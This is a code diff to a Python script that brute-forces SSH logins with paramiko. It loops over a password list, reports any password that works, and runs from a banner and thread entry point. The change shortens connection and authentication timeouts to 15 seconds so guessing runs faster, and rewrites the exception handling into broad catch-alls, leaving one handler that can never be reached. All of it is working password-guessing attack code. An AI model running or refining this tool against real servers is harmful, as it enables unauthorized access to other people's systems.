@@ -31,7 +31,7 @@ def ssh_brute():
             password = f.strip()
             ssh = paramiko.SSHClient()
             ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-            ssh.connect(host, port, user, password, banner_timeout=200, auth_timeout=200)
+            ssh.connect(host, port, user, password, banner_timeout=15, auth_timeout=15)
             #stdin, stdout, stderr = ssh.exec_command(command)
             #lines = stdout.readlines()
             print("Password Found: "+password)
@@ -40,16 +40,15 @@ def ssh_brute():
             print("[+] Trying password as "+password)
         except paramiko.ssh_exception.SSHException:
             pass
-        except EOFError:
-            pass
-        except Exception:
+        except (RuntimeError, TypeError, NameError, Exception):
             pass
         except FileNotFoundError:
             print("File Not Found")
         except KeyboardInterrupt:
             print("Exiting Program...")
             sys.exit()
-         
+        except:
+            pass
 
 
 def print_banner():
@@ -65,8 +64,3 @@ def thread_main():
     
 print_banner()
 thread_main()
-
-
-
-
-
